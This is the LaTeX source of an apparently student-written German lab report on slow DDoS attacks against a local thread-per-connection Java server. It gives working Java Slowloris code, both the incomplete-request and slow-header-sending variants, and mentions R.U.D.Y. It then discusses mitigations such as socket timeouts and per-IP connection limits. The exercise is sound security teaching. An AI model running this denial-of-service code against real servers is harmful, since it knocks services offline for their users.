\NeedsTeXFormat{LaTeX2e}
\documentclass[a4paper,12pt,
headsepline,           % Linie zw. Kopfzeile und Text
oneside,               % zweiseitig
pointlessnumbers,      % keine Punkte nach den letzten Ziffern in Überschriften
bibtotoc,              % LV im IV
%DIV=15,               % Satzspiegel auf 15er Raster, schmalere Ränder   
BCOR15mm               % Bindekorrektur
%,draft
]{scrbook}
\KOMAoptions{DIV=last} % Neuberechnung Satzspiegel nach Laden von Paket helvet

\pagestyle{headings}
\usepackage{blindtext}

% für Texte in deutscher Sprache
\usepackage[ngerman]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}

% Helvetica als Standard-Dokumentschrift
\usepackage[scaled]{helvet}
%\usepackage{mathptmx}
\renewcommand{\familydefault}{\sfdefault} 

\usepackage{graphicx}

% Für Tabellen mit fester Gesamtbreite und variabler Spaltenbreite
\usepackage{tabularx} 

% Besondere Schriftauszeichnungen
\usepackage{url}              % \url{http://...} in Schreibmaschinenschrift
\usepackage{color}            % zum Setzen farbigen Textes

\usepackage{amssymb, amsmath} % Pakete für Mathe-Umgebungen und -Symbole

\usepackage{setspace}         % Paket für div. Abstände, z.B. ZA
%\onehalfspacing              % nur dann, wenn gefordert; ist sehr groß!!
\setlength{\parindent}{0pt}   % kein linker Einzug der ersten Absatzzeile
\setlength{\parskip}{1.4ex plus 0.35ex minus 0.3ex} % Absatzabstand, leicht variabel

% Tiefe, bis zu der Überschriften in das Inhaltsverzeichnis kommen
\setcounter{tocdepth}{3}      % ist Standard


%\usepackage[printonlyused, withpage]{acronym}
\usepackage[printonlyused]{acronym}
\usepackage{comment}
\usepackage{longtable}
%\usepackage[maxdepth=8, mark]{gitinfo2}
\usepackage{bytefield}
\usepackage{smartdiagram}
\usepackage{caption}
\usepackage{hyperref}
\usepackage{hypcap}
\usepackage{graphicx}
\usepackage{tikz}
\usepackage{mathtools}
\usepackage{colortbl}
\usepackage{xcolor}
\usepackage[outline]{contour}
\usetikzlibrary{arrows}
\usetikzlibrary{calc,positioning,shapes,decorations.pathreplacing, matrix, backgrounds, fit}

% hier Namen etc. einsetzen
\newcommand{\fullname}{Björn Petersen}
\newcommand{\email}{bjoern.petersen@uni-ulm.de}
\newcommand{\titel}{Darstellung und Analyse SoC interner Kommunikationskanäle auf Protokollebene}
\newcommand{\jahr}{2020}
\newcommand{\matnr}{941984}
\newcommand{\gutachterA}{Prof.\,Dr.-Ing\,Maurits Ortmanns}
\newcommand{\gutachterB}{Dr.\,rer.\,nat.\,Dipl.-Ing\,Endric Schubert}
\newcommand{\betreuer}{Dipl-Ing\, Ulrich Langenbach}

% hier die Fakultät auswählen
%\newcommand{\fakultaet}{---  Im Quellcode anpassen nicht vergessen! ---}
\newcommand{\fakultaet}{Ingenieurwissenschaften, Informatik und\\Psychologie}
%\newcommand{\fakultaet}{Mathematik und\\Wirtschafts-\\wissenschaften}
%\newcommand{\fakultaet}{Medizin}
%\newcommand{\fakultaet}{Naturwissenschaften}

% hier das Institut einsetzen
\newcommand{\institut}{Institut für Mikroelektronik}

% Informationen, die LaTeX in die PDF-Datei schreibt
\pdfinfo{
  /Author (\fullname)
  /Title (\titel)
  /Producer     (pdfeTex 3.14159-1.30.6-2.2)
  /Keywords ()
}

\usepackage{hyperref}
\hypersetup{
pdftitle=\titel,
pdfauthor=\fullname,
pdfsubject={Diplomarbeit},
pdfproducer={pdfeTex 3.14159-1.30.6-2.2},
colorlinks=false,
pdfborder=0 0 0	% keine Box um die Links!
}

\usepackage{listings}
\lstset{
  language=java,
  basicstyle=\ttfamily,
  columns=fullflexible,
  frame=single,
  breaklines=true,
  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}
}

% Trennungsregeln
\hyphenation{Sil-ben-trenn-ung}

%commandes
\newcommand{\selfprotokoll}{SELF-Protokoll}

\title{Slow DDoS-Angriffe auf Internetdienste}
\date{Juli 20, 2020}
\author{Björn Petersen}

\begin{document}

\maketitle

\section*{Webserver}
Der Server wurde wie folgt angepasst
\begin{lstlisting}
    public static void main(String[] args) throws IOException {

        ExecutorService executorService = Executors.newFixedThreadPool(threadPoolSize);
        ServerSocket serverSocket = new ServerSocket(port);

        while(true) {

            Socket clientSocket = serverSocket.accept();
            new ConnectionThread(clientSocket).start();


            System.out.println("Connection from " + clientSocket.getRemoteSocketAddress()
                    + "; Active Connections: " + ConnectionThread.activeConnections.get());
        }
    }
\end{lstlisting}

\section*{Slowloris - Unvollständige Anfrage}
Es werden mehrere Unvollständige Verbindungen zu dem Server aufgebaut, welche dazu führen, dass der Server irgendwann keine weiteren Verbindungen mehr bearbeiten kann und somit kommt es zu einem Denial of Service.
\begin{lstlisting}
    public static void main(String[] args) throws InterruptedException, IOException {

        for (int i=0; i<30; i++) {
            openSocket();
        }
        while (true);
    }
        

    private static void openSocket() throws IOException {
        Socket socket = new Socket(host, port);
        var outputStream = socket.getOutputStream();

        String header = "POST / HTTP/1.1\r\n" + "Host: " + host + "\n";

        outputStream.write(header.getBytes());
    }
\end{lstlisting}

\section*{Webserver - Timeouts}
Durch das einfügen eines Timeouts werden verbindungen abgebrochen, die nicht mehr reagieren, womit es nicht mehr zu einem Denial of Service kommt.
Das Timeout kann durch folgende Funktion eingestellt werden: \texttt{clientSocket.setSoTimeout(1000)}

\section*{Slowloris - Langsames Senden}
Die Aufgabe beschäftig sich damit, den Server wieder anzugreifen, so dass es zu einem Denial of Service kommt. Dies wird erziehlt
durch langsames Senden von mehreren Clients an den Server, so dass der Timeout immer genau ausgereizt wird und somit der Server blockiert wird.
Nachfolgend ist der Code zu sehen der verwendet wurde
\begin{lstlisting}
    public static void main(String[] args) throws InterruptedException, IOException {
        sockets = new ArrayList<>();

        for (int c=0; c<15; ++c) {
            openSocket();
        }

        while (true) {
            Thread.sleep(600);
            for (var socket : sockets) {
                sendLine(socket);
            }
        }
    }
    \dots

    private static void sendLine(Socket socket) throws IOException {
        var ostream = socket.getOutputStream();

        StringBuilder field = new StringBuilder();
        for (int c=0; c<8; ++c) {
            byte asciiVal = (byte) (ThreadLocalRandom.current().nextInt(46) + 'A');
            if (asciiVal > 'Z') {
                asciiVal = (byte) (asciiVal - 'A' - 26 + 'a');
            }
            field.append((char) asciiVal);
        }

        String line = "\r\nX-" + field.toString() + ": " + ThreadLocalRandom.current().nextInt(10000);
        System.out.print(line);

        ostream.write(line.getBytes());
    }
\end{lstlisting}

\section*{R.U.D.Y}
Diese Aufgabe beschäftigt sich damit, den Server durch einen R.U.D.Y. Angriff zu schwöchen. Der dafür benötigte Code ist 
identisch zu der Aufgabe 4, außer dass im Header keine GET Request angefragt wird, sondern ein Post. Dieser Angriff ist ebenfalls erfolgreich.

\section*{Fragen}

\begin{enumerate}
    \item Bei dieserServer Architektur handelt es sich um einen Server, der bei jeder Verbindung einen neuen Thread startet. Dies ist ähnlich zu einem Apache Server. Der Nachteil ist wie durch das Blatt gezeigt wurde, dass nur eine bestimmte Anzahl an Verbindungen angenommen werden kann, was den Server anfällig für Slow DDoS Angriffe macht
    \item Da aufgrund einer schlechten Internet Verbindung auch normale Endgeräte ohne böse Absichten langsam Senden
    \item Nein, da bei dieser Art  von Angriffen bereits wenig Verbinungen viele Resourcen verbrauchen, schützt die Erhöhung der maximalen Verbindungen nicht
    \item \begin{itemize}
        \item Überprüfen der eingegangenen Nachrichten, ob sie Sinnvoll sind oder ob es sich um einen Angriff handeln könnte
        \item Wählen einer anderen Server Architektur, bspw Nginx
        \item Limitieren der Anzahl an Verbindungen pro IP-Adresse
    \end{itemize}
\end{enumerate}

\end{document}
